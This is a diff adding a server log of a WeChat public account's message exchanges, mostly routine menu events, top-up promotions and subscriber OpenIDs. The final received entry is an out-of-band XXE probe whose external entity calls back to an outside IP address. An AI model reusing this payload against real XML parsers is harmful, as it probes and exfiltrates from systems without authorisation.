@@ -1,0 +1,250 @@
+17:37:07 R <xml><ToUserName><![CDATA[gh_3e927f412d52]]></ToUserName>
+<FromUserName><![CDATA[oQVwHj6WH2o2LHIZN0PpEdGBRUD4]]></FromUserName>
+<CreateTime>1501493828</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[VIEW]]></Event>
+<EventKey><![CDATA[http://www.hahafamily.com/yswx/user_center.php]]></EventKey>
+<MenuId>425898949</MenuId>
+</xml>
+17:37:07 T <xml>
+<ToUserName><![CDATA[oQVwHj6WH2o2LHIZN0PpEdGBRUD4]]></ToUserName>
+<FromUserName><![CDATA[gh_3e927f412d52]]></FromUserName>
+<CreateTime>1501493827</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[]]></Content>
+</xml>
+17:37:13 R <xml><ToUserName><![CDATA[gh_3e927f412d52]]></ToUserName>
+<FromUserName><![CDATA[oQVwHj6WH2o2LHIZN0PpEdGBRUD4]]></FromUserName>
+<CreateTime>1501493834</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[VIEW]]></Event>
+<EventKey><![CDATA[http://www.hahafamily.com/yswx/user_center.php?a=friend]]></EventKey>
+<MenuId>425898949</MenuId>
+</xml>
+17:37:13 T <xml>
+<ToUserName><![CDATA[oQVwHj6WH2o2LHIZN0PpEdGBRUD4]]></ToUserName>
+<FromUserName><![CDATA[gh_3e927f412d52]]></FromUserName>
+<CreateTime>1501493833</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[]]></Content>
+</xml>
+17:37:16 R <xml><ToUserName><![CDATA[gh_3e927f412d52]]></ToUserName>
+<FromUserName><![CDATA[oQVwHj6WH2o2LHIZN0PpEdGBRUD4]]></FromUserName>
+<CreateTime>1501493837</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[VIEW]]></Event>
+<EventKey><![CDATA[http://www.hahafamily.com/yswx/user_center.php]]></EventKey>
+<MenuId>425898949</MenuId>
+</xml>
+17:37:16 T <xml>
+<ToUserName><![CDATA[oQVwHj6WH2o2LHIZN0PpEdGBRUD4]]></ToUserName>
+<FromUserName><![CDATA[gh_3e927f412d52]]></FromUserName>
+<CreateTime>1501493836</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[]]></Content>
+</xml>
+17:37:26 R <xml><ToUserName><![CDATA[gh_3e927f412d52]]></ToUserName>
+<FromUserName><![CDATA[oQVwHj6WH2o2LHIZN0PpEdGBRUD4]]></FromUserName>
+<CreateTime>1501493847</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[CLICK]]></Event>
+<EventKey><![CDATA[chongZhi]]></EventKey>
+</xml>
+17:37:26 T <xml>
+<ToUserName><![CDATA[oQVwHj6WH2o2LHIZN0PpEdGBRUD4]]></ToUserName>
+<FromUserName><![CDATA[gh_3e927f412d52]]></FromUserName>
+<CreateTime>1501493846</CreateTime>
+<MsgType><![CDATA[news]]></MsgType>
+<Content><![CDATA[]]></Content>
+<ArticleCount>1</ArticleCount>
+<Articles>
+    <item>
+        <Title><![CDATA[充值]]></Title>
+        <Description><![CDATA[充值8折优惠，并送好礼，详情点击查看 
+联系电话：0551-45687545]]></Description>
+        <PicUrl><![CDATA[http://www.hahafamily.com/yswx/images/peterclub-addess.jpg]]></PicUrl>
+        <Url><![CDATA[http://www.hahafamily.com/yswx/topup.php?a=up&openid=oQVwHj6WH2o2LHIZN0PpEdGBRUD4]]></Url>
+    </item>
+</Articles>
+</xml>
+17:49:45 R <xml><ToUserName><![CDATA[gh_3e927f412d52]]></ToUserName>
+<FromUserName><![CDATA[oQVwHj6WH2o2LHIZN0PpEdGBRUD4]]></FromUserName>
+<CreateTime>1501494586</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[CLICK]]></Event>
+<EventKey><![CDATA[chongZhi]]></EventKey>
+</xml>
+17:49:45 T <xml>
+<ToUserName><![CDATA[oQVwHj6WH2o2LHIZN0PpEdGBRUD4]]></ToUserName>
+<FromUserName><![CDATA[gh_3e927f412d52]]></FromUserName>
+<CreateTime>1501494585</CreateTime>
+<MsgType><![CDATA[news]]></MsgType>
+<Content><![CDATA[]]></Content>
+<ArticleCount>1</ArticleCount>
+<Articles>
+    <item>
+        <Title><![CDATA[充值]]></Title>
+        <Description><![CDATA[充值8折优惠，并送好礼，详情点击查看 
+联系电话：0551-45687545]]></Description>
+        <PicUrl><![CDATA[http://www.hahafamily.com/yswx/images/peterclub-addess.jpg]]></PicUrl>
+        <Url><![CDATA[http://www.hahafamily.com/yswx/topup.php?a=up&openid=oQVwHj6WH2o2LHIZN0PpEdGBRUD4]]></Url>
+    </item>
+</Articles>
+</xml>
+19:33:37 R <xml><ToUserName><![CDATA[gh_3e927f412d52]]></ToUserName>
+<FromUserName><![CDATA[oQVwHj-oSL1ABY843Ea84S8ge_gU]]></FromUserName>
+<CreateTime>1501500818</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[CLICK]]></Event>
+<EventKey><![CDATA[chongZhi]]></EventKey>
+</xml>
+19:33:37 T <xml>
+<ToUserName><![CDATA[oQVwHj-oSL1ABY843Ea84S8ge_gU]]></ToUserName>
+<FromUserName><![CDATA[gh_3e927f412d52]]></FromUserName>
+<CreateTime>1501500817</CreateTime>
+<MsgType><![CDATA[news]]></MsgType>
+<Content><![CDATA[]]></Content>
+<ArticleCount>1</ArticleCount>
+<Articles>
+    <item>
+        <Title><![CDATA[充值]]></Title>
+        <Description><![CDATA[充值8折优惠，并送好礼，详情点击查看 
+联系电话：0551-45687545]]></Description>
+        <PicUrl><![CDATA[http://www.hahafamily.com/yswx/images/peterclub-addess.jpg]]></PicUrl>
+        <Url><![CDATA[http://www.hahafamily.com/yswx/topup.php?a=up&openid=oQVwHj-oSL1ABY843Ea84S8ge_gU]]></Url>
+    </item>
+</Articles>
+</xml>
+19:33:44 R <xml><ToUserName><![CDATA[gh_3e927f412d52]]></ToUserName>
+<FromUserName><![CDATA[oQVwHj-oSL1ABY843Ea84S8ge_gU]]></FromUserName>
+<CreateTime>1501500825</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[VIEW]]></Event>
+<EventKey><![CDATA[http://www.meituan.com/]]></EventKey>
+<MenuId>425898949</MenuId>
+</xml>
+19:33:44 T <xml>
+<ToUserName><![CDATA[oQVwHj-oSL1ABY843Ea84S8ge_gU]]></ToUserName>
+<FromUserName><![CDATA[gh_3e927f412d52]]></FromUserName>
+<CreateTime>1501500824</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[]]></Content>
+</xml>
+19:33:51 R <xml><ToUserName><![CDATA[gh_3e927f412d52]]></ToUserName>
+<FromUserName><![CDATA[oQVwHj-oSL1ABY843Ea84S8ge_gU]]></FromUserName>
+<CreateTime>1501500833</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[CLICK]]></Event>
+<EventKey><![CDATA[woDeDingDan]]></EventKey>
+</xml>
+19:33:51 T <xml>
+<ToUserName><![CDATA[oQVwHj-oSL1ABY843Ea84S8ge_gU]]></ToUserName>
+<FromUserName><![CDATA[gh_3e927f412d52]]></FromUserName>
+<CreateTime>1501500831</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[你点击了:woDeDingDan
+你的OpenID是 oQVwHj-oSL1ABY843Ea84S8ge_gU
+]]></Content>
+</xml>
+19:33:55 R <xml><ToUserName><![CDATA[gh_3e927f412d52]]></ToUserName>
+<FromUserName><![CDATA[oQVwHj-oSL1ABY843Ea84S8ge_gU]]></FromUserName>
+<CreateTime>1501500836</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[VIEW]]></Event>
+<EventKey><![CDATA[http://www.hahafamily.com/yswx/user_center.php?a=friend]]></EventKey>
+<MenuId>425898949</MenuId>
+</xml>
+19:33:55 T <xml>
+<ToUserName><![CDATA[oQVwHj-oSL1ABY843Ea84S8ge_gU]]></ToUserName>
+<FromUserName><![CDATA[gh_3e927f412d52]]></FromUserName>
+<CreateTime>1501500835</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[]]></Content>
+</xml>
+16:28:47 R <xml><ToUserName><![CDATA[gh_3e927f412d52]]></ToUserName>
+<FromUserName><![CDATA[oQVwHjx86gl23TQl0lmxGT8SHDdk]]></FromUserName>
+<CreateTime>1501576127</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[CLICK]]></Event>
+<EventKey><![CDATA[chongZhi]]></EventKey>
+</xml>
+16:28:47 T <xml>
+<ToUserName><![CDATA[oQVwHjx86gl23TQl0lmxGT8SHDdk]]></ToUserName>
+<FromUserName><![CDATA[gh_3e927f412d52]]></FromUserName>
+<CreateTime>1501576127</CreateTime>
+<MsgType><![CDATA[news]]></MsgType>
+<Content><![CDATA[]]></Content>
+<ArticleCount>1</ArticleCount>
+<Articles>
+    <item>
+        <Title><![CDATA[充值]]></Title>
+        <Description><![CDATA[充值8折优惠，并送好礼，详情点击查看 
+联系电话：0551-45687545]]></Description>
+        <PicUrl><![CDATA[http://www.hahafamily.com/yswx/images/peterclub-addess.jpg]]></PicUrl>
+        <Url><![CDATA[http://www.hahafamily.com/yswx/topup.php?a=up&openid=oQVwHjx86gl23TQl0lmxGT8SHDdk]]></Url>
+    </item>
+</Articles>
+</xml>
+14:49:17 R <xml><ToUserName><![CDATA[gh_3e927f412d52]]></ToUserName>
+<FromUserName><![CDATA[oQVwHjx86gl23TQl0lmxGT8SHDdk]]></FromUserName>
+<CreateTime>1501656558</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[VIEW]]></Event>
+<EventKey><![CDATA[http://www.hahafamily.com/yswx/user_center.php]]></EventKey>
+<MenuId>425898949</MenuId>
+</xml>
+14:49:17 T <xml>
+<ToUserName><![CDATA[oQVwHjx86gl23TQl0lmxGT8SHDdk]]></ToUserName>
+<FromUserName><![CDATA[gh_3e927f412d52]]></FromUserName>
+<CreateTime>1501656557</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[]]></Content>
+</xml>
+14:49:23 R <xml><ToUserName><![CDATA[gh_3e927f412d52]]></ToUserName>
+<FromUserName><![CDATA[oQVwHjx86gl23TQl0lmxGT8SHDdk]]></FromUserName>
+<CreateTime>1501656564</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[CLICK]]></Event>
+<EventKey><![CDATA[chongZhi]]></EventKey>
+</xml>
+14:49:23 T <xml>
+<ToUserName><![CDATA[oQVwHjx86gl23TQl0lmxGT8SHDdk]]></ToUserName>
+<FromUserName><![CDATA[gh_3e927f412d52]]></FromUserName>
+<CreateTime>1501656563</CreateTime>
+<MsgType><![CDATA[news]]></MsgType>
+<Content><![CDATA[]]></Content>
+<ArticleCount>1</ArticleCount>
+<Articles>
+    <item>
+        <Title><![CDATA[充值]]></Title>
+        <Description><![CDATA[充值8折优惠，并送好礼，详情点击查看 
+联系电话：0551-45687545]]></Description>
+        <PicUrl><![CDATA[http://www.hahafamily.com/yswx/images/peterclub-addess.jpg]]></PicUrl>
+        <Url><![CDATA[http://www.hahafamily.com/yswx/topup.php?a=up&openid=oQVwHjx86gl23TQl0lmxGT8SHDdk]]></Url>
+    </item>
+</Articles>
+</xml>
+11:46:37 R <xml><ToUserName><![CDATA[gh_3e927f412d52]]></ToUserName>
+<FromUserName><![CDATA[oQVwHjx86gl23TQl0lmxGT8SHDdk]]></FromUserName>
+<CreateTime>1501818397</CreateTime>
+<MsgType><![CDATA[event]]></MsgType>
+<Event><![CDATA[VIEW]]></Event>
+<EventKey><![CDATA[http://www.hahafamily.com/yswx/user_center.php]]></EventKey>
+<MenuId>425898949</MenuId>
+</xml>
+11:46:37 T <xml>
+<ToUserName><![CDATA[oQVwHjx86gl23TQl0lmxGT8SHDdk]]></ToUserName>
+<FromUserName><![CDATA[gh_3e927f412d52]]></FromUserName>
+<CreateTime>1501818397</CreateTime>
+<MsgType><![CDATA[text]]></MsgType>
+<Content><![CDATA[]]></Content>
+</xml>
+00:36:11 R <?xml version="1.0" encoding="utf-8"?>
+                            <!DOCTYPE ANY [
+	                            <!ENTITY h SYSTEM "http://119.29.144.42/rec.php?u=2399624257">
+                            ]>
+                            <xml>
+	                            <test>&h;</test>
+                            </xml>
+                            
+00:36:11 T 
